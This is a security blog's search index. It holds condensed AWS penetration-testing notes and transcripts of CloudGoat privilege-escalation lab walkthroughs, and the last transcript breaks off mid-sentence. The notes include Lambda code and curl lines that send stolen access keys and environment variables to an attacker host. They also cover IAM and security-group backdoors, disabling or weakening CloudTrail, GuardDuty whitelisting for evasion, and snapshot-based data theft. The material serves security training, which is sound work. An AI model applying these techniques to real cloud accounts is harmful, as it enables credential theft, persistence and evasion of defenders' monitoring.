      "tags"     : "Privesc, Notes, Bypass, GuardDuty",
      "url"      : "/2022/09/11/Hands-on-AWS-Penetration-Testing-Notes/",
      "date"     : "Sep 11, 2022",
      "content"  : " hands on aws penetration testing table of contents chapter 4 setting up ec2 instance storage types used in ec2 instances note that there are many different types of storage types but these are the main ones elastic block storage highspeed storage volumes best suited for highspeed and frequent data writes and reads these volumes can persist even after ec2 instance destroyed snapshot of ebs volume can be created ec2 instance store used for storing data temporarily physically attached to host computer lost if ec2 instance is destroyed elastic filesystem efs can only be used with linuxbased ec2 instance can be used as a common data source can be used simultaneously by multiple ec2 instance s3 used by ec2 to store ebs snapshots and instance storebacked amis general purpose ssd volumes gp2 low level of latency and costeffective 1 gb to 16 tb provisioned iops ssd i01 volumes like gp2 but superior faster supports more iops input output operations per second designed for databases 4 gb to 16 tb ec2 firewall settings each ec2 has its own firewall security groups linux amis configured to authenticate ssh using key pair authentication rather than a password chapter 6 elastic block stores and snapshots retrieving deleted data ebs volume types and encryption two types of ebs 1 ssd used for transactional workloads frequent read write operations high iops 2 hdd meant for large streaming workloads encryption made with amazon kms implements aes 256bit encryption performed on data at rest snapshots created from volume and all disk i o cmk used to encrypt the data is stored in the volume that is attached to the ec2 instance all ebs volume types support full disk encryption but not all ec2 instances support encrypted volumes the following ec2 instances support ebs encryption general purpose a1 m3 m4 m5 m5d t2 and t3 compute optimized c3 c4 c5 c5d and c5n memory optimized cr1 8xlarge r3 r4 r5 r5d x1 x1e and z1d storage optimized d2 h1 2xlarge h1 4xlarge i2 and i3 accelerated computing f1 g2 g3 p2 and p3 bare metal i3 metal m5 metal m5d metal r5 metal r5d metal u6tb1 metal u9tb1 metal u12tb1 metal and z1d metal snapshots of encrypted storage volumes are encrypted by default volumes created from those snapshots are also encrypted by default ec2 instance can simultaneously have encrypted and unencrypted storage volumes chapter 7 identifying vulnerable s3 buckets s3 permissions and the access apitwo s3 permission systems 1 access control policies acps simplified permissions system primarily used by web ui2 iam access policies json objects to provide access to object access to bucket must first be granted policies can be applied to individual folders files in a bucket can be public without the bucket being publicly listable acps acls every s3 bucket has acl access control list attached to it four main types of acls 1 read view filenames size and last modified time of object can download objects that you have access to 2 write read delete and upload objects can possibly delete objects you do not have permissions to 3 readacp view acls of any bucket or object that you have access to 4 writeacp modify acl of any bucket or object you have access to bucket policyjson version 20080227 statement sid statement effect allow principal aws arn aws iam accountid user kirit action s3 getbucketlocation s3 listbucket s3 getobject resource arn aws s3 kiritbucket chapter 8 exploiting s3 buckets javascript contained in s3 bucket can be backdoored could infect a webapp when the javascript is executed https aws amazon com premiumsupport knowledgecenter secures3resources https aws amazon com premiumsupport knowledgecenter secures3resources backdooring s3 buckets for persistence bucket hijack s3 bucket may be deleted but cname record would remain essentially making the bucket name unclaimed create s3 bucket with same name and region as unclaimed bucket this vulnerability is found with the nosuchbucket error message https hackerone com reports 399166 https hackerone com reports 399166 hackerone real bucket hijack chapter 9 iam sts getcalleridentity is always allowed and cannot be denied userid in this case aidajutnaf4akiriatj6w is how the user is referenced in the backend untitled hands 20on 20aws 20penetration 20testing 20fb1122d58b584d7a96b594c659fa2ae8 untitled png can enumerate users with the account id without creating logs in target account best practice is to specify the resource that the action applies to rather than doing resource for example the following is bad practice json action ec2 resource optional condition key under what conditions specifications in the statement apply e g mfa must be used source ip address timeframe etc https docs aws amazon com iam latest userguide reference policies elements condition operators html https docs aws amazon com iam latest userguide reference policies elements condition operators html security best practice to not use inline policies managed policies allow the following 1 reusability 2 central change management 3 versioning and rolling back 4 delegating permissions management inline policies can be converted to managed policies inline policies can be created during or after creation of identity roles and groups roles cannot be added to groups roles default lifespan of role api keys sts assumerole is 1 hour roles allow for stricter auditing and permissions management trust relationships specify who can assume the role and under what conditions json version 20121017 statement effect allow principal service ec2 amazonaws com http ec2 amazonaws com action sts assumerole principals can include other iam users aws services or aws account can assume crossaccount roles for persistence groups used to give a set of users the same permissions a user can be part of 10 groups at most a group can hold up to as many users that are allowed in the account api request signing most aws api calls require data be signed before it is sent to aws servers allows server to verify identity of api caller protect data from modification while it is in transit mostly prevents replay attacks signed request valid for five minutes by default chapter 10 privesc boto3 and pacu accessdeniederrors are very noisy boto3 is used in the backend of aws cli boto3python usr bin env python3import boto3session boto3 session session profile name test region name uswest2 gets creates session from profile credsclient session client iam pacu can be used to automate some enumeration tasks good for enumeration but outdated and not reliable for exploitation chapter 11 persistence you can backdoor user creds role trust relationships ec2 security groups lambda functions etc best practice is to use sso with temporary federated access rather than an iam user with an access key and secret access key backdooring users create another access key pairaws iam listaccesskeys username user name profile profile each user has limit of two access key pairs so create another access key pair simple easy to detect backdoor removed after compromised iam user account is deleted can privesc with iam createaccesskey backdooring role trust relationships most common backdoor technique role trust policies can be updated at will role trust policies provide access to other aws accounts can update trust policy to create relationship between role and personal attacker aws account not all trust policies of roles can be updated generally true for servicelinked roles for example input aws iam createservicelinkedrole awsservicename lex amazonaws com description my servicelinked role to support lex output json role path awsservicerole lex amazonaws com rolename awsserviceroleforlexbots roleid aroa1234567890example arn arn aws iam 1234567890 role awsservicerole lex amazonaws com awsserviceroleforlexbots createdate 20190417t20 34 14 00 00 assumerolepolicydocument version 20121017 statement action sts assumerole effect allow principal service lex amazonaws com all aws service roles contain path awsservicerole no other roles allowed to use this path iam trust policythe following trust policy allows the ec2 service to assume a role json version 20121017 statement effect allow principal service ec2 amazonaws com action sts assumerole useful for when iam role added to ec2 instance profile and then the instance profile is attached to an ec2 instance allows for temp creds to be used by ec2 instance to perform role actions adding backdoor to trust policy do not overwrite trust policy update the policy with your arn aws iam updateassumerolepolicy rolename role name policydocument file trustpolicybackdoor json file trustpolicybackdoor json profile profile note that the policybackdoor json will contain the crossaccount arn backdooring ec2 security groups ippermissions contains inbound traffic rules ippermissionsegress contains outbound traffic rules to backdoor you can allow inbound traffic from your ip address aws ec2 authorizesecuritygroupingress groupid sg0315cp741b51fr4d0 protocol tcp port ports cidr attacker ip backdooring lambda function trigger lambda function upon a certain event works only if cloudtrail logging is enabled because the lambda function backdoor will be configured to trigger upon an event can create backdoor such as creating a second access key pair for a new user then exfiltrating the key pair python import boto3 from botocore vendored import requests def lambda handler event context if event detail eventname createuser client boto3 client iam try response client create access key username event detail requestparamete rs username requests post post url data akid response accesskey accesskeyid sak response accesskey secretaccesskey except pass return best practice to enable cloudtrail across all aws regions it is better to backdoor existing lambda functions as it is stealthier this avoids creating new resources in an environment which can be noisy backdooring ecr if it is possible to log into the container registry pull a docker image and update it in the aws environment then an image can be modified with an attacker s malware to establish persistence chapter 12 pentesting lambda lamba is considered serverless but technically isolated servers are spun up for the duration of a function s runtime filesystem is readonly except for tmp you are a lowprivileged user check environment variables of lambda functions aws lambda listfunctions profile profile event injection if rce can be obtained on the lambda function creds can be exfiltrated via environment variables as opposed to ec2 where it is in the metadata serice read environment variables with env and exfiltrate with curl curl x post d env attacker ip bash runs commands enclosed in backticks first lambda has curl by default may be able to indirectly invoke a function that is set to automatically trigger upon an event in a different service e g lambda function triggers on an uploaded file in an s3 bucket aws lambda getpolicy functionname vulnerablefunction profile lambdareadonlytester region uswest2 json version 20121017 id default statement sid 000000000000 event permissions for lambdatriggerons3upload from bucketforlambdapentesting for vul effect allow principal service s3 amazonaws com action lambda invokefunction resource arn aws lambda uswest2 000000000000 function vulnerablefunction condition stringequals aws sourceaccount 000000000000 arnlike aws sourcearn arn aws s3 bucketforlambdapentesting note that not all lambda functions have a resource policy default execution timeout for function is three seconds lambda malicious code python requestslibrary not one of the default lambda libraries but this can be imported via the botocore package from botocore vendored import requests python from botocore vendored import requests requests post http 1 1 1 1 http 1 1 1 1 json os environ copy timeout 0 01 ensure the malicious code is wrapped in a try and except to avoid errors from showing up in the logs be aware of the lambda function s timeout it is much better and stealthier to insert malicious code into the function s used dependencies rather than to the function s code itself export lambda function to zip file and then reupload it with modified dependencie chapter 14 targeting other services exploitation of route 53 simple email service ses cloudformation and elastic container registry ecr route 53 route 53 is a scalable dns domain management service good to use for recon allows association of ips and host names can discover domains and subdomains other than for recon route53 is not useful for pentesters too disruptive how malicious attackers exploit route53 change dns records to point to their web server route dns queries between different networks and vpc can provide insight into other networks not hosted within aws or can give insight into other services within vpcs simple email service ses good to use for phishing if a policy is attached to an ses identity then it has restrictions permissive ses identities do not have any policies attached to them aws ses listidentitypolicies identity test test com to get a policy you can use aws ses getidentitypolicies identity identity policyname policy example output json version 20081017 statement sid stmt1242527116212 effect allow principal aws arn aws iam 000000000000 user exampleadmin action ses sendemail resource arn aws ses uswest2 000000000000 identity admin example com can update ses identity policy with aws ses putidentitypolicy identity admin example com mailto admin example com policyname policy name policy file modified policy json ses supports crossaccount email sending as long as account not in ses sandbox and is verified and enabled you can send emails to any account outside of the email s domain otherwise phishing can only be performed against other emails with the same domain templates within environment can be found with aws ses listtemplates and aws ses gettemplate templateanme template name cloudformation can suffer from hardcoded secrets overly permissive deployments etc aws cloudformation describestacks stack parameters some sensitive information can show up if noecho is not set to true json parameters parameterkey keyname parametervalue mysshkey parameterkey dbpassword parametervalue apassword2 parameterkey sshlocation parametervalue 0 0 0 0 0 parameterkey dbname parametervalue customerdatabase parameterkey dbuser parametervalue parameterkey instancetype parametervalue t2 small upon being set to true the parameter value will be censored with characters note that dbuser may or may not have a password 4 characters long password constraints should be checked by viewing the template for the stack stack output values essentially the same thing as parameters but these values were generated during the creation of the stack can potentially have access keys such as if a template creates an iam user with an access key pair stack termination protection termination protection provides additional protection against the termination of a cloudformation stack this requires that you first disable the stack then delete a stack which requires a different set of permissions cannot be leveraged as an attacker but it is good practiceto check this you can run aws cloudformation describestacks stackname stack name enableterminationprotection will be set to true or false deleted stacksaws cloudformation liststacks shows all stacks even deleted ones aws cloudformation describestacks stackname arn aws cloudformation uswest2 000000000000 stack deleted stack 23801r22906h53a0pao374yre14208z6 shows parameters and output values of the stack note that deleted stacks must be referenced by their arn stack exports exports share output values between stacks without the need to reference them exported values are also shown under the outputs of the stacks exports can help give info about target environment and or the user cases of the stackaws cloudformation listexports shows name and value of each export and the stack that exported it stack templatesaws cloudformation gettemplate stackname stack name contains information regarding the setup of various resources can help identify resources misconfigurations hardcoded secrets etc passed roles stacks can be passed with other roles using iam passrole an iam user with cloudformation can escalate privileges by modifying other higherprivileged stacks stacks with passed roles can be identified if a stack s arn has the rolearn key with the value of an iam role s arn role s permissions can be inferred by its name via the resources that the stack deployed and the stack s templateaws cloudformation describestackresources stackname stack name shows what resources were created by the stackaws cloudformation updatestack stackname stack name templatebody file template json parameters file params json updates stack with modified template that can for example perform additional api calls on behalf of the role s permissions attached to the stack essentially a privesc discovering values of noecho parameters cloudformation updatestack is needed to uncover noecho values note that as a pentester you should also have cloudformation gettemplate it is possible to retrieve the value for noecho parameters with just updatestack but this requires updating a template with our own which would result in the loss of resources that the stack created because we are essentially completely replacing the previously used template instead of modifying it elastic container registry ecr fully managed docker container service for deploying storing and managing docker container images it may be possible to escalate privileges by logging into the container registry and pulling a docker image chapter 15 pentesting cloudtrail auditingthe following keys should be set to true within cloudtrail key description additional info ismultiregional ensures cloudtrail is logging across all regions this is more efficient than creating individual trails for each region additionally new aws regions get released includeglobalserviceevents logs api activity for nonregion specific aws services e g iam and s3 logfilevalidationenabled identify deletion modification of logs kmskeyid the key used to encrypt the logs absence of this key means that the logs are not encrypted if hascustomeventselectors is true then perform the following command to view which events are being logged aws cloudtrail geteventselectors trailname trail name to see if the trail is enabled perform the following command aws cloudtrail gettrailstatus name trail name check if the islogging key is set to true make sure the values for latestdeliveryattempttime and latestdeliveryattemptsucceeded are the same otherwise there may be a problem when cloudtrail is delivering logs to s3 recon unlike cloudtrail logs cloudtrail s event history is immutable using cloudtrail lookupevents it is possible to view the event history of cloudtrail this way you can see cloudtrail events without needing s3 and kms if you do have s3 and kms permissions be careful of downloading logs it may be alarming easier to stay stealthy when the usual activity of users services is known lookupevents is slow as it returns up to 50 events persecond therefore it is important to filter before downloading events from cloudtrail s event history example event history json eventversion 1 06 useridentity type iamuser principalid aidaracq1tw2rmllaqftx arn arn aws iam 000000000000 user testuser accountid 000000000000 accesskeyid asiaqa94xb3p0prusfz2 username testuser sessioncontext attributes creationdate 20181228t18 49 59z mfaauthenticated true invokedby signin amazonaws com eventtime 20181228t20 07 51z eventsource cloudtrail amazonaws com eventname createtrail awsregion useast1 sourceipaddress 1 1 1 1 useragent signin amazonaws com requestparameters name exampletrail s3bucketname exampleforcloudtraillogs s3keyprefix includeglobalserviceevents true ismultiregiontrail true enablelogfilevalidation true kmskeyid arn aws kms useast1 000000000000 key 4a9238p0r4j7103i44hvl457396t3s9t isorganizationtrail false responseelements name exampletrail s3bucketname exampleforcloudtraillogs s3keyprefix includeglobalserviceevents true ismultiregiontrail true trailarn arn aws cloudtrail useast1 000000000000 trail exampletrail logfilevalidationenabled true kmskeyid arn aws kms useast1 000000000000 key 4a9238p0r4j7103i44hvl457396t3s9t isorganizationtrail false requestid a27t225a459800313829e5h130432279 eventid 173ii4381g592815ei8jw24091jk3p88 readonly false eventtype awsapicall managementevent true recipientaccountid 000000000000 signin amazonaws com means the action was performed by the aws web console make sure to change your user agent to match the useragent value in the event history bypassing logging using unsupported services api calls to unsupported services do not produce any logs in cloudtrail including the event history furthermore no cloudwatch event rules can be created for unsupported services api calls to unsupported services can be leveraged to help determine whether a key pair is being used as a canary token defenders should refrain from providing permissions to unsupported cloudtrail services unless absolutely necessary if so then make use of any potential builtin logging within the unsupported service view iam credentialed reports to identify services that were accessed aws iam getcredentialreport and perform aws iam generateservicelastaccuseddetails arn iam resource arn to see which services a specific resource accessed this return a jobid which can be viewed with aws iam getservicelastaccesseddetails jobid job id note this does not show what activity a resource performed within the service it only shows whether a resource successfully authenticated to a service and when crossaccount enumerationuser enumeration requires knowing account id of target use pacu to enumerate users and roles ensure that the creds provided have iam updateassumerolepolicy and that the creds are owned by your aws account usersrun iam enum users accountid 123456789012 rolename attacker created role roles run iam enum roles accountid 123456789012 rolename attacker created role this module attempts to assume discovered roles which can be successful in case of a misconfiguration disrupting trails any of the following methods can be performed with run detetion disruptions trails trail name aws region you will then be prompted to minimize weaken disable or delete the specified trail disruptions of cloudtrail will likely cause alarms however it is possible to nevertheless stay under the radar if guardduty or other monitoring services are not implemented guardduty will trigger an stealth iamuser cloudtrailloggingdisabled alert upon disabling a trail or stealth iamuser loggingconfigurationmodified upon modifying a trail s configuration disabling a trailaws cloudtrail stoplogging name trail name must be run from the same region as the trail to not have an invalidhomeregionexception error deleting a trail or its s3 bucket can delete trail completely or s3 bucket that holds the logsdeleting trail aws cloudtrail deletetrail name trail namedeleting s3 bucket will leave trail in an error state find s3 bucket trail is sending logs to view the s3bucketname key aws cloudtrail describetrails delete bucket aws s3api deletebucket bucket bucket name weakening a trail or its s3 bucketweakening a trail use cloutrail updatetrail to modify a trail s monitoring configurations and cause it to only monitor unimportant events that are unrelated to the specific attackweakening trail s s3 bucket logging requires the cloudtrail puteventselectors permission modify event selectors to prevent the logging of certain types of events such as by avoiding s3 lambda logging by removing those services from the dataresources key in the event selector policy can also modify readwritetype to avoid recording read or write eventsaws cloudtrail puteventselectors trailname trail name eventselectors file weakened event selectors json bypassing guardduty guardduty can potentially be bypassed if a user typically configures cloudtrail configurations identify usual activity of compromised user to avoid guardduty from being triggered modify certain logs from s3 bucket works if log file validation is misconfigured note that this activity will still be in cloudtrail s event history but cloudtrail s event history is slow and has limitations therefore this allows an attacker to buy some time chapter 16 guardduty guardduty is enabled on a perregion basisthree data sources guardduty analyzes 1 vpc flow logs2 couldtrail event logs3 dns logs dns logs can only be used if requests are routed through aws dns resolvers default for ec2 vpc flow logs and cloudtrail event logs do not need to be enabled for guardduty to use them guardduty can be managed crossaccount such as in the scenario where one master account has control over the guardduty configurations for a different aws account anomalies in user behavior are reported as guardduty relies on machine learningrun the following command to see if guardduty is enabled in the region aws guardduty listdetectors bypassing techniques distraction can purposely trigger certain alerts to distract a defender from your real path if guardduty is using cloudwatch events you could use the putevents api to provide fake unexpected data to guardduty findings that could break the target of the cloudwatch events rule false data in the correct format could also be sent to confuse defenders disabling monitoring not recommended as it causes damage to the environmentto disable a guardduty detector aws guardduty updatedetector detectorid detector id noenableddelete detector aws guardduty deletedetector detectorid detector id whitelisting ips in the guardduty whitelist will not cause any guardduty findings this means you can perform any api call within the region and no findings will be generated enumeration and modification of guardduty settings are not triggered requires iam putrolepolicy maximum of 2000 ip addresses and cidr ranges in one trusted ip list only one trusted ip list exists per regionto check if a trusted ip list is associated with a detector aws guardduty listipsets detectorid detector idcreating a whitelist for a detector 1 create s3 bucket on local attacker aws account2 upload attacker ip in txt to an s3 bucket 3 open the s3 bucket4 aws guardduty createipset detectorid detector id format txt location https s3 amazonaws com attacker bucket ipwhitelist txt name whitelist activateupdating a whitelist in this scenario you should essentially update the trusted ip list1 enumerate ips in trusted list aws guardduty getipset detectorid detector id ipsetid ip set id returns location of public s3 bucket used for whitelisting which you can download save the location so that guardduty configurations can be restored after the engagement2 go through steps 13 in creating a whitelist for a detector and ensure the contents of the s3 whitelist file also contain the ips of the downloaded trusted list 3 aws guardduty updateipset detectorid detector id ipsetid ip set id location https s3 amazonaws com attacker bucket ipwhitelist txt activate bypassing ec2 credential exfiltration alerts this alert is unauthorizedaccess iamuser instancecredentialexfiltration and applies only to ec2 instances caused when credentials exclusively for an ec2 instance are being used from an external ip address old note that external ip address is referring to an address outside all of ec2 not necessarily the ec2 instance that the iam instance profile is attached to patched since january 2022 due to unauthorizedaccess iamuser instancecredentialexfiltration insideaws since january 2022 bypass is possible by creating an ec2 instance in the attacker aws account and issuing api calls from the instance via vpc endpoints in a private subnet see sneakyendpoints https github com frichetten sneakyendpoints other bypasses1 refrain from using tor 2 no port scanning from or to an ec2 instance3 do not bruteforce ssh or rdp4 get reverse shells from usual ports such as 80 or 443 to bypass behavior ec2 networkportunusual5 exfiltrate data with a limited bandwidth to avoid behavior ec2 networkportunusual6 do not change the password policy to avoid stealth iamuser passwordpolicychange7 do not perform dns exfiltration from a compromised ec2 instance to avoid trojan ec2 dnsdataexfiltration this still could potentially still be bypassed even with dns exfiltration via nonaws dns resolvers chapter 19 real world aws pentesting have a local user with iam updateassumerolepolicy and s3 listbucket permissions for unauthenticated cross account enumeration always make sure to delete resources that were created in the environment to avoid charging the client and creating billing alerts that could potentially get you caught unauthenticated reconnaissance perform api call on a service that is not logged by cloudtrail to get the target aws account number pacu1 enumerate users with iam enum users2 enumerate roles with iam enum roles3 enumerate buckets with s3 bucket finder postexploitation look for as many misconfigurations as possible ec2 look for instances with public ip addresses instances without public ip addresses could still be accessed by initializing another instance within the same vpc or modifying the security group of existing instances run ec2 backdoor ec2 sec groups portrange 165535 protocol tcp ip 1 1 1 1 32 ebs look for snapshots and volumes1 create a snapshot of the ebs volume and share that snapshot with the attacker account 1 the alternative to sharing the snapshot with a crossaccount which is typically audited and flagged is performing all the steps in the compromised account however this runs the risk of getting blocked before anything important is found 2 create a news ebs volume with the snapshot 3 create an ec2 instance and mount the volume to it 4 dig through the contents of the mounted volume this is automated with pacu s ebs explore snapshots lambda if possible download the source code of all lambda functions and run bandit if it is python rds gain access to rds instance data by copying its contents to a newly created rds instance rds explore snapshots 1 create snapshot of targeted instance and use the snapshot with an instance you create 2 change master password of new instance give yourself inbound access 1 note this uses the modifydbinstance api the same call for modifying networking settings monitoring settings etc and is not a noisy event 3 connect to the database and exfiltrate the data maybe use mysqldump auditing for compliance and best practices check description public access is x publicly accessible encryption is x encrypted atrest and or intransit logging is logging enabled for x and what is being done with the logs backups how often is x backed up other is mfa enabled is the password policy weak is deletion protection being implemented on appropriate resources toolshttps github com jordanpotti awsbucketdump https github com jordanpotti awsbucketdump enumerate s3 buckets and download interesting fileshttps github com rhinosecuritylabs pacu https github com rhinosecuritylabs pacu like linpeas and winpeas except it s for aws and automates exploitationhttps github com skyscanner cfripper https github com skyscanner cfripper https github com stelligent cfn nag https github com stelligent cfn nag cfripper and cfn nag can be run against cloudformation templates to identify insecure configurationshttps github com anchore anchoreengine https github com anchore anchoreengine analyzes docker images and scans for vulnerabilitieshttps github com coreos clair https github com coreos clair container static analysishttps github com frichetten sneakyendpoints https github com frichetten sneakyendpoints vpc endpoints with ec2 instance for performing api calls with exfiltrated ec2 credentials without triggering guardduty unauthorizedaccess iamuser instancecredentialexfiltration outsideawshttps github com nccgroup scout2 https github com nccgroup scout2 aws auditing toolhttps github com prowlercloud prowler https github com prowlercloud prowler aws auditing toolhttps github com netflix security monkey https github com netflix security monkey aws auditing tool",
      "image": "/images/hands_on_aws_pentesting.jpg"
		},
		{
      "title"    : "Hacking in the Cloud - Cloudgoat: lambda_privesc",
      "category" : "Videos",
      "tags"     : "Videos, Lambda, Cloudgoat, AWS, iam:PassRole",
      "url"      : "/videos/2022/07/16/Lambda-Privesc/",
      "date"     : "Jul 16, 2022",
      "content"  : "We start off as a low-privileged user who can perform IAM Get and IAM List on all resources. In addition, this user can assume a role which has lambda:* and iam:PassRole on all resources. Using this permission, it was possible to create a function with another role that had AdministratorAccess attached to it. Therefore, we were able to attach AdministratorAccess on the low-privileged user. hello everybody this is zero day and this is the lambda private scenario in the cloud go to series you start off as the chris user who can perform iam get an im list on all resources but chris also has the permission to assume a role and when you list the roles you see that there is one role called lame the manager that you could actually assume and once you get the credentials for this lambda roll you find out that this lambda roll can perform land any land of command on any resource but more importantly you have the iam pass role permission that was given to this lambda manager role and using this permission you can use a higher privileged role that has administrator access it was a lambda debug role and you use this role to pass the administrator access role to a function that you create now this function could be could have any sort of arbitrary script that you want the one that we did in this video was the iam attach policy command which gave the administrator access policy to the chris user we start off as the chris user so let's just put that profile in profile chris and we can copy paste and let's begin by enumerating the permissions of chris so we can look at the managed and inline policies associated with this user so you can do that with the ian list dash attached policies sorry user policies profile chris and we need to provide a username so let's just do that really quick aws sts get dash caller dash identity we put in the profile and now we can get this user and put that in user name chris and this is the manage policy associated with the user before looking at this manage policy let's see if this user has any inline policies so aws iem list user dash policies this looks at all the inline policies and again let's provide the username and there are no inline policies associated with this user so let's see what this managed policy entails so aws get dash policy profile and we need to provide the policy arn policy dash arn which is up here and just just gives us a little more information we see that this policy is only attached to one identity which is our chris user and it's running the v1 version the default version so let's get this uh version so version id v1 and get this policy dash version and these are the permissions associated with this managed policy we can perform iam list and i am get on all resources but on top of that we can also perform assume a role on all resources so let's look at what kind of roles there are in this cloud environment we could do that with the aws iam list dash roles command and these are all the roles associated with this cloud infrastructure here are just a couple of default roles so let's look at the custom user made rules we have a debug role with this arn but we cannot assume it because you need to be part of this lambda service in order to perform this action we also have another role the lambda manager role with this arn and we can perform sts assume role as long as this is our identity and as we can see this is our user chris lambda proves with all of this weird characters at the end over here but this is our user and therefore we can assume this role now before assuming this role let's look at the permissions associated with the role that we can assume but also the role that we cannot assume as they are both of interest so let's look at the attached policies the managed policies associated with both roles and let's look at the inline policies associated with both roles so we can look at the managed policies of a role with the list dash attached as a role dash policies command and we can provide our profile let's make sure to also put iam over there and we need to provide a role name so the role name for lambda manager is this could just put that in there and there is one managed policy associated with this role let's look at let's look if there are any inline policies associated with this rule so list dash role there's policies there's nothing so let's once again get the policy version except this time for this arn so policy dash arn profile chris and let's also put the iam right there and a version id v1 we can see that it is okay to assume that the version that's currently running for this role is v1 because we see right here that this is set to true that the default version for this policy is in fact v1 so this role can perform any lambda function on any resource but it could also do iam pass role which is extremely powerful because what iam pass role will allow us to do is to create some sort of function for example which we can do with lambda we can create some sort of lambda function and pass any role to this function including a role that is higher privilege than us so think of this kind of like a set uid binary except it's set uid for let's say root for example so we have a set we can create a set uid binary for root it's kind of like the equivalent and before we we do that let's look to see uh if there are any we had one other function or one other role it was called somewhere up here the debug role so let's get this as well so we want to get aws i am list dash attach this role this policies and provider profile and also a role name and we have one policy associated with this role and it is the administrator access policy which is quite convenient because we can actually use this role to get administrator access let's also look to see if there are any inline policies and there are none so no inline policies associated with this role but there is one managed policy so this is an extremely powerful role as it has administrator access so if we could somehow use this role to create a function with the permissions of this role then we can create any kind of function including a function that performs an attached attach role policy command and therefore we can get attach a role we can get an administrator access role on our chris user it might sound a little bit confusing at first but as we do it it will make more sense what we will need to do is create a function a lambda function and before we do that let's make sure that we assume the role of that user or of that role that we had permission to assume which was called lambda manager i'll just run this command again it's very important to save the outputs of your commands so let's again just list roles profile chris and this is our role and we want to assume it so aws sts assumed role and we want to provide a role arn and a role session name so our role arn is this and our role session name is the role name of lambda manager right here and we can provide our profile i misspelled it here oral session name and we get the access key secret access key and session token associated with this role so let's just quickly put that in let's configure let's call it lambda manager let's put the axis key the secret access key and the session token so i don't want to open my credentials file because then my other credentials are exposed so let's just put in the echo command and let's put in the session token aws underscore session underscore token equals this and let's put it into the aws credentials file so now when we do the aws sts gets dash caller identity dash profile lambda manager we get the manager and we don't we don't have any kind of errors saying that our session token or our security token is invalid so now that we have this user we want to create some function and use this function with the role of administrator and the role that has that administrator access is that debug role that we saw so let's create a function let's call it uh attach role exploit dot pi so we want to import beot03 moto 3 that's just a software development kit that's integrated with aws it allows you to perform all kinds of different actions in an aws environment and one of them one of the things that we could do is attach user policy so we can attach a policy to our chris user using the attach user policy command we need to first define a function and we can call this function any kind of handler let's call this let's call this uh please subscribe underscore handler and we want to give it an event and a context and we can give we can say client equals boto3 dot client iam because we want to perform an iam command and response equals client dot attach underscore user underscore policy user name equals and we need our username of the chris user so sts get caller dash identity profile chris this is our chris user so let's put this in and we also want a role name so our or our policy and the policy that we would like is the administrator access policy so policy ar n equals and i don't know the the administrative access policy are in off the top of my head so we can just do aws iem list policies profile chris grep administrator access there's tons of different policies so this takes a while but eventually we get this here's the arn and that's it so now we have this python script and we can perform our function which is aws lambda create dash function and there's many different things many different parameters that we need to input with this function and we could do that we could see all the different parameters with the help command it'll show us all the necessary parameters that we must input as well as the optional commands optional parameters so the necessary parameters are function name and role and the optional parameters are all enclosed in brackets so things such as runtime handler code and zip file we would like to input our function as a zip file and yeah let's let's get right to it so we have aws lambda create dash function that's function dash name let's call it please work role our role is that debug rule that we saw earlier that has the administrator access permission associated with it so aws iam list roles and debug this was the role we also want to give it a run time and the handler so let's make sure to do that so we have runtime python 3.8 let's say 3.9 let's give it a handler so our handler was what was it again was it please subscribe yeah please subscribe underscore handler and our function was called attach roll exploit so we first provide the function name which is or the script name which is attach underscore role underscore exploit and we give it our handler so please subscribe underscore handler and what other things do we need we need to provide a zip file as well that contains our script so let's zip and let's call it attach roll exploit dot zip so now we have our zip file so dash dash zip dash file and attach underscore role on exploit.zip and finally we can provide our profile which is lambda lambda manager so this rule failed to satisfy the necessary conditions so what i just did is i plugged in the role session name and i didn't plug in the role arn so what we want is the role arn which is right here so let's just put that in and now we successfully created the function we have please work and it's just initiating into the environment the function is being created creating by now it's probably created it's quite a small function and i'm sure the zip file is very small as well so now what we can do is invoke the function and we could do that with the lambda func the lambda module and let's do help to see all the parameters of invoke so ada was lambda invoke help so when we invoke we must input a function name and an output file so let's do aws lambda dash dash function dash name and our function name was please work so please work and out file which is let's call it output.txt now before we invoke this function let's see the managed policies associated with chris before and after this exploit so if it all works then we should see that there's a difference between the before and after so aws iam and we want to get the list attached user policies of chris so profile chris and we want to give it the username oops exit and i gave it the arn rather than the username let's put the username so this is the only managed policy associated with the chris user and let's see what it is after we run this command we must specify a region i did not put in lambda manager here and we see that there was no error here so let's see cat output no which means the the script successfully ran the reason it's null and not anything else because in the script i didn't tell it to do anything else other than just perform the attach user policy command so now let's list the manage policies associated with this user and we can see that this user now also has administrator access so we successfully ran this function with higher privileges than what we initially had and therefore we were able to get administrator access by passing the debug role over to this function of please work so please work now has administrator access privileges and once we ran that that way we got administrator access on our chris user",
      "image": "/images/lambda_privesc.png"
		},

		{
      "title"    : "Hacking in the Cloud - Cloudgoat: iam_privesc_by_rollback",
      "category" : "Videos",
      "tags"     : "Videos, IAM, Cloudgoat, AWS",
      "url"      : "/videos/2022/07/08/IAM-Privesc-By-Rollback/",
      "date"     : "Jul 08, 2022",
      "content"  : "Video Context - Enumerating user’s permissions - Changing policy’s default permissions - Getting AdministratorAccess hello everybody this is zero day this is the second scenario in the most simple scenario out of the entire cloud good series as of now you start off as a very high privileged user who can perform iam get and i am list permissions on all resources but on top of that you have a iam set default policy version permission which when you list after listing all the policy versions that are associated with your managed policy you see that one of the versions you can perform any action on any resource so all you have to do is set your default policy version as that extremely powerful version and you can do whatever you would like including giving yourself administrator access we were provided the credentials of the first user named raynor as you can see here so let's put it in raynor we'll call him raynor like this and we'll put in the axis key and the secret key we will leave it the default uh region name as us east one so now that we are the rain or user let's try to enumerate so we could do that with the iam module which will show us all the permissions and roles associated with this identity so first of all let's see if we can even do a get user command which is basically a who am i we can see that this is our username here's our arn and we even get a little bit more data related to the tags associated with this user so to find out the permissions we need to see which policies are attached to this user so we can do that with the list dash attached user policies command which will look at all the managed policies that are attached to the specified identity and we need to provide our profile and also our username so we see that the username is this so let's put that in there and these this is our manage policy before looking at that let's see if we have any inline policies which are just policies that are embedded in an identity so we could do that with the list user policies command and again provide the username and we see there are no inline policies associated with this user so let's look at the manage policy and we could do that with the get dash policy command we provide our profile and we'll see that it looks for our policy arn which we have right here so dash desk policy that's ar n put that in and it just gives us a little more data about our policy we can see that our default version id is v1 we have some one attachment and the rest of this data is not that interesting let's look at this version id v1 so we can get an idea of what our permissions are so we could do that with the aws iam get dash policy dash version we specify our profile and we give our arn policy arn which is this and we also have to give a version id which is v1 because that is the version that is right now enabled for our policy and these are the policies associated with this user we have i am get an im list on all resources but more interestingly we can set the default policy version for all resources so right now our default version is v1 but let's look at our other versions to see maybe if other versions contain permissions that we currently do not have and maybe there are permissions that are even more powerful than the one we have right now so first of all let's list our permissions and if there's ever any kind of command that you are not sure about we could just do 